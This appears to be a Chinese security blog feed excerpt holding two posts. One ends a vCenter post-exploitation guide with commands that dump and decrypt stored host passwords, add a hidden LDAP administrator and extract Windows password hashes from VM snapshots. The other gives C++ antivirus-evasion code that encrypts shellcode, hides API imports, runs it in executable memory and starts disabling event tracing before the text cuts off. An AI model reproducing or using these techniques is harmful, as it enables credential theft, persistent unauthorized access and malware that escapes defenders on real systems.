src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664177386905-d4cccd39-b526-439d-8007-139f046edbee.png#clientId=u5514ee4d-e108-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=142&id=u771bee9a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=213&originWidth=660&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24805&status=error&style=none&taskId=u962835c6-dfcd-465d-abf5-47c35138d61&title=&width=440" alt="image.png"></p><h4 id="连接数据库，读取-vpxuser-密钥"><a href="#连接数据库，读取-vpxuser-密钥" class="headerlink" title="连接数据库，读取 vpxuser 密钥"></a>连接数据库，读取 vpxuser 密钥</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># linux</span></span><br><span class="line"><span class="string">/opt/vmware/vpostgres/current/bin/psql</span> <span class="string">-h</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="string">-p</span> <span class="number">5432</span> <span class="string">-U</span> <span class="string">vc</span> <span class="string">-d</span> <span class="string">VCDB</span> <span class="string">-c</span> <span class="string">"select ip_address,user_name,password from vpx_host;"</span> <span class="string">&gt;</span> <span class="string">password.enc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#windows</span></span><br><span class="line"><span class="string">C:\Program</span> <span class="string">Files\VMware\vCenter</span> <span class="string">Server\vPostgres\bin\psql.exe</span> <span class="string">-h</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="string">-p</span> <span class="number">5432</span> <span class="string">-U</span> <span class="string">vc</span> <span class="string">-d</span> <span class="string">VCDB</span> <span class="string">-c</span> <span class="string">"select ip_address,user_name,password from vpx_host;"</span> <span class="string">&gt;</span> <span class="string">password.enc</span></span><br></pre></td></tr></table></figure><h3 id="6-3、获取symkey-dat文件"><a href="#6-3、获取symkey-dat文件" class="headerlink" title="6.3、获取symkey.dat文件"></a>6.3、获取symkey.dat文件</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># linux</span><br><span class="line">/etc/vmware-vpx/ssl/symkey.dat</span><br><span class="line"></span><br><span class="line"># windows</span><br><span class="line">C:<span class="symbol">\P</span>rogramData<span class="symbol">\V</span>Mware<span class="symbol">\v</span>CenterServer<span class="symbol">\c</span>fg<span class="symbol">\v</span>mware-vpx<span class="symbol">\s</span>sl<span class="symbol">\s</span>ymkey.dat</span><br></pre></td></tr></table></figure><h4 id="解密-vpxuser-密码"><a href="#解密-vpxuser-密码" class="headerlink" title="解密 vpxuser 密码"></a>解密 vpxuser 密码</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">decrypt</span><span class="selector-class">.py</span> <span class="selector-tag">symkey</span><span class="selector-class">.dat</span> <span class="selector-tag">password</span><span class="selector-class">.enc</span> <span class="selector-tag">password</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><h3 id="6-4、拿到权限后添加账户"><a href="#6-4、拿到权限后添加账户" class="headerlink" title="6.4、拿到权限后添加账户"></a>6.4、拿到权限后添加账户</h3><h4 id="添加账户"><a href="#添加账户" class="headerlink" title="添加账户"></a>添加账户</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> vCenterLDAP_Manage.<span class="keyword">py</span> adduser</span><br><span class="line"><span class="built_in">input</span> the <span class="keyword">new</span> username: <span class="number">1234</span>admininput the dn: <span class="keyword">cn</span>=<span class="number">1234</span>admin,<span class="keyword">cn</span>=Users,dc=vsphere,dc=localinput the userPrincipalName: <span class="number">1234</span>admin@vsphere.local</span><br></pre></td></tr></table></figure><h4 id="提升至管理员"><a href="#提升至管理员" class="headerlink" title="提升至管理员"></a>提升至管理员</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vCenterLDAP_Manage.py addadmininput the<span class="built_in"> user </span>dn: <span class="attribute">cn</span>=1234admin,cn=Users,dc=vsphere,dc=local</span><br></pre></td></tr></table></figure><h3 id="0x07后续"><a href="#0x07后续" class="headerlink" title="0x07后续"></a>0x07后续</h3><h4 id="7-1、创建快照"><a href="#7-1、创建快照" class="headerlink" title="7.1、创建快照"></a>7.1、创建快照</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1666945673264-ff04ef79-902d-48ea-9d44-2630c61f4644.png#clientId=uff4985c1-1738-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=695&id=uf160b882&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1043&originWidth=1711&originalType=binary&ratio=1&rotation=0&showTitle=false&size=220842&status=error&style=none&taskId=u2476fa89-caf4-4bbf-a5c0-06bc91334cc&title=&width=1140.6666666666667" alt="image.png"><br>分析快照文件需要.vmem文件作为参数，而.vmem文件通常很大，为了提高效率，这里选择将volatility上传至VMware ESXI，在VMware ESXI上分析快照文件。</p><h5 id="volatility下载：【Windows】、【Linux】"><a href="#volatility下载：【Windows】、【Linux】" class="headerlink" title="volatility下载：【Windows】、【Linux】"></a>volatility下载：【<a href="http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_win64_standalone.exe" target="_blank" rel="noopener">Windows</a>】、【<a href="http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_lin64_standalone.zip" target="_blank" rel="noopener">Linux</a>】</h5><h3 id="7-2-volatility利用"><a href="#7-2-volatility利用" class="headerlink" title="7.2 volatility利用"></a>7.2 volatility利用</h3><h5 id="7-2-1、通过镜像信息获得系统版本，命令如下"><a href="#7-2-1、通过镜像信息获得系统版本，命令如下" class="headerlink" title="7.2.1、通过镜像信息获得系统版本，命令如下"></a>7.2.1、通过镜像信息获得系统版本，命令如下</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\<span class="selector-tag">volatility_2</span><span class="selector-class">.6_win64_standalone</span><span class="selector-class">.exe</span> <span class="selector-tag">-f</span> <span class="selector-tag">xxxx-Snapshot2</span><span class="selector-class">.vmem</span> <span class="selector-tag">imageinfo</span></span><br></pre></td></tr></table></figure><h5 id="7-2-2、读取profile，列出注册表内容"><a href="#7-2-2、读取profile，列出注册表内容" class="headerlink" title="7.2.2、读取profile，列出注册表内容"></a>7.2.2、读取profile，列出注册表内容</h5><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.<span class="symbol">\v</span>olatility_2.6_win64_standalone.exe -f xxx-Snapshot2.vmem --profile=xxx hivelist</span><br><span class="line"></span><br><span class="line">## 关注</span><br><span class="line">REGISTRY<span class="symbol">\M</span>ACHINE<span class="symbol">\S</span>YSTEM</span><br><span class="line">SystemRoot<span class="symbol">\S</span>ystem32<span class="symbol">\C</span>onfig<span class="symbol">\S</span>AM</span><br></pre></td></tr></table></figure><h5 id="7-2-3、使用hashdump获取hash值"><a href="#7-2-3、使用hashdump获取hash值" class="headerlink" title="7.2.3、使用hashdump获取hash值"></a>7.2.3、使用hashdump获取hash值</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility_2<span class="number">.6</span>_win64_standalone.exe -f xxx-Snapshot2.vmem --profile=xxx hashdump -y <span class="number">0xfffff8a000024010</span> -s <span class="number">0xfffff8a000478010</span></span><br></pre></td></tr></table></figure><h5 id="7-2-4、从注册表读取LSA-Secrets"><a href="#7-2-4、从注册表读取LSA-Secrets" class="headerlink" title="7.2.4、从注册表读取LSA Secrets"></a>7.2.4、从注册表读取LSA Secrets</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility_2.<span class="number">6_</span>win64_standalone.exe -f xxx-<span class="module-access"><span class="module"><span class="identifier">Snapshot2</span>.</span></span>vmem --profile=xxx lsadump</span><br></pre></td></tr></table></figure><h5 id="7-2-5、导出所有域用户hash"><a href="#7-2-5、导出所有域用户hash" class="headerlink" title="7.2.5、导出所有域用户hash"></a>7.2.5、导出所有域用户hash</h5><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://forum.butian.net/share/1893" target="_blank" rel="noopener">https://forum.butian.net/share/1893</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;查看版本信息&quot;&gt;&lt;a href=&quot;#查看版本信息&quot; class=&quot;headerlink&quot; title=&quot;查看版本信息&quot;&gt;&lt;/a&gt;查看版本信息&lt;/h2&gt;&lt;figure class=&quot;highlight awk&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt;/sdk/&lt;/span&gt;vimServiceVersions.xml&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="vCenter" scheme="https://chenzidu.github.io/tags/vCenter/"/>
    
  </entry>
  
  <entry>
    <title>C++变形免杀初探（一）</title>
    <link href="https://chenzidu.github.io/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://chenzidu.github.io/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2022-09-22T06:50:05.000Z</published>
    <updated>2022-12-11T09:31:21.953Z</updated>
    
    <content type="html"><![CDATA[<p>好久没水文章了，最近一段时间一直在忙项目上的事情。= =</p><a id="more"></a><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>shellcode -&gt; 加密算法 -&gt;生成恶意加密shellcode -&gt;加载器 -&gt;解密算法 -&gt; 执行恶意shellcode</li></ul><p>利用外部库来进行加解密操作，增加分析难度，可以加base64，不过base64可能会把不可见字符转换出问题，不过两层加密基本够了，太多层反而效率变慢了。</p><h3 id="外部库"><a href="#外部库" class="headerlink" title="外部库"></a>外部库</h3><ul><li>crypto</li><li>boost</li></ul><h2 id="加密部分"><a href="#加密部分" class="headerlink" title="加密部分"></a>加密部分</h2><h3 id="异或部分"><a href="#异或部分" class="headerlink" title="异或部分"></a>异或部分</h3><p>异或和位移，可以说是复杂度最低的算法了，效率高。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shift_encryption</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">char</span> plain[], <span class="keyword">char</span> ciphertext[])</span>  <span class="comment">//移位加密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; plain[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (plain[i] &gt; <span class="number">64</span> &amp;&amp; plain[i] &lt; <span class="number">91</span>)<span class="comment">//确定是字母</span></span><br><span class="line">        &#123;</span><br><span class="line">            ciphertext[i] = plain[i] + k;</span><br><span class="line">            <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">90</span>) <span class="comment">//保证密文是字母，且大小写不发生改变</span></span><br><span class="line">                ciphertext[i] = ciphertext[i] - <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (plain[i] &gt; <span class="number">96</span> &amp;&amp; plain[i] &lt; <span class="number">123</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ciphertext[i] = plain[i] + k;</span><br><span class="line">            <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">122</span>)</span><br><span class="line">                ciphertext[i] = ciphertext[i] - <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shift_decryption</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">char</span> plain[], <span class="keyword">char</span> ciphertext[])</span>  <span class="comment">//移位加密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; ciphertext[i] != <span class="string">'\0'</span>; i++)<span class="comment">//确定是字母</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">64</span> &amp;&amp; ciphertext[i] &lt; <span class="number">91</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            plain[i] = ciphertext[i] - k;</span><br><span class="line">            <span class="keyword">if</span> (plain[i] &lt; <span class="number">65</span>)<span class="comment">//保证密文是字母，且大小写不发生改变</span></span><br><span class="line">                plain[i] = plain[i] + <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">96</span> &amp;&amp; ciphertext[i] &lt; <span class="number">123</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            plain[i] = ciphertext[i] - k;</span><br><span class="line">            <span class="keyword">if</span> (plain[i] &lt; <span class="number">97</span>)<span class="comment">//保证密文是字母，且大小写不发生改变</span></span><br><span class="line">                plain[i] = plain[i] + <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> password = <span class="number">1025</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> enShellCode[<span class="number">6000</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> deShellCode[<span class="number">6000</span>];</span><br><span class="line">    <span class="keyword">int</span> nLen = <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        enShellCode[i] = buf[i] ^ password;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\\x%x"</span>, enShellCode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        deShellCode[i] = enShellCode[i] ^ password;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\\x%x"</span>, deShellCode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h3><p> 获取时间戳来进行aes加密，利用外部库boost获取时间戳。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int64_t GetCurrentStamp64()</span><br><span class="line">&#123;</span><br><span class="line">    /<span class="regexp">/获取当前时间戳(秒or毫秒)</span></span><br><span class="line"><span class="regexp">    boost::posix_time::ptime epoch(boost::gregorian::date(1970, boost::gregorian::Jan, 1));</span></span><br><span class="line"><span class="regexp">    boost::posix_time::time_duration time_from_epoch = boost::posix_time::second_clock::universal_time() - epoch;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    return time_from_epoch.total_seconds();</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">enAES</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 使用ECB模式加密</span></span><br><span class="line">        ECB_Mode&lt; AES &gt;::Encryption e;</span><br><span class="line">        e.SetKey(key, <span class="keyword">sizeof</span>(key));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在此处加密</span></span><br><span class="line">        <span class="comment">// StreamTransformationFilter根据需要添加填充，使用PKCS_padding（PKCS7Padding）默认值。</span></span><br><span class="line">        <span class="comment">// ECB和CBC模式必须填充到密码的块大小。</span></span><br><span class="line">        StringSource(strPlain, <span class="literal">true</span>,</span><br><span class="line">            <span class="keyword">new</span> StreamTransformationFilter(e,</span><br><span class="line">                <span class="keyword">new</span> StringSink(strCipher) <span class="comment">// 字符串接收器</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> Exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cerr</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    strEncoded.<span class="built_in">clear</span>();</span><br><span class="line">    StringSource(strCipher, <span class="literal">true</span>,</span><br><span class="line">        <span class="keyword">new</span> HexEncoder(</span><br><span class="line">            <span class="keyword">new</span> StringSink(strEncoded)</span><br><span class="line">        ) <span class="comment">//</span></span><br><span class="line">    ); <span class="comment">// StringSource</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deAES</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// decrypt with ECB mode</span></span><br><span class="line">        ECB_Mode&lt; AES &gt;::Decryption d;</span><br><span class="line">        d.SetKey(key, <span class="keyword">sizeof</span>(key));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The StreamTransformationFilter removes padding as required.</span></span><br><span class="line">        <span class="function">StringSource <span class="title">s</span><span class="params">(strCipher, <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">new</span> StreamTransformationFilter(d,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">new</span> StringSink(strRecovered) <span class="comment">// StringSink</span></span></span></span><br><span class="line"><span class="function"><span class="params">            ) <span class="comment">// StreamTransformationFilter</span></span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span>; <span class="comment">// StringSource</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> Exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cerr</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h2><h3 id="导入表混淆"><a href="#导入表混淆" class="headerlink" title="导入表混淆"></a>导入表混淆</h3><h2 id="修改参数为函数名"><a href="#修改参数为函数名" class="headerlink" title="修改参数为函数名"></a>修改参数为函数名</h2><p>原理：对C++程序的导入表进行混淆。不做任何混淆时的导入表存在例如VirtualAlloc这样的敏感函数，通过隐藏函数的方式来减少马子特征。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> VOID *(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T  dwSize, DWORD flAllocationType, DWORD flProtect);</span><br><span class="line">pVirtualAlloc fnVirtualProtect;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> sVirtualProtect[] = &#123; <span class="string">'V'</span>,<span class="string">'i'</span>,<span class="string">'r'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'a'</span>,<span class="string">'l'</span>,<span class="string">'A'</span>,<span class="string">'l'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'c'</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> sKernel32[] = &#123; <span class="string">'k'</span>,<span class="string">'e'</span>,<span class="string">'r'</span>,<span class="string">'n'</span>,<span class="string">'e'</span>,<span class="string">'l'</span>,<span class="string">'3'</span>,<span class="string">'2'</span>,<span class="string">'.'</span>,<span class="string">'d'</span>,<span class="string">'l'</span>,<span class="string">'l'</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">fnVirtualProtect = (pVirtualAlloc)GetProcAddress(GetModuleHandle((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);</span><br><span class="line"><span class="keyword">void</span>* exec = fnVirtualProtect(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(exec, deShellCode, <span class="keyword">sizeof</span> deShellCode);</span><br><span class="line">((<span class="keyword">void</span>(*)())exec)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="禁用Windows事件跟踪-ETW"><a href="#禁用Windows事件跟踪-ETW" class="headerlink" title="禁用Windows事件跟踪 (ETW)"></a>禁用Windows事件跟踪 (ETW)</h2><p>原理：Windows 事件跟踪 (ETW) 是一种有效的内核级跟踪工具，允许你将内核或应用程序定义的事件记录到日志文件中。 可以实时或从日志文件使用事件，并使用它们调试应用程序或确定应用程序中发生性能问题的位置。</p><p>ETW 允许动态启用或禁用事件跟踪，使你可以在生产环境中执行详细的跟踪，而无需重启计算机或应用程序。</p><p>结合混淆导入表代码如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span>* (*tNtVirtual) (HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T  NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG 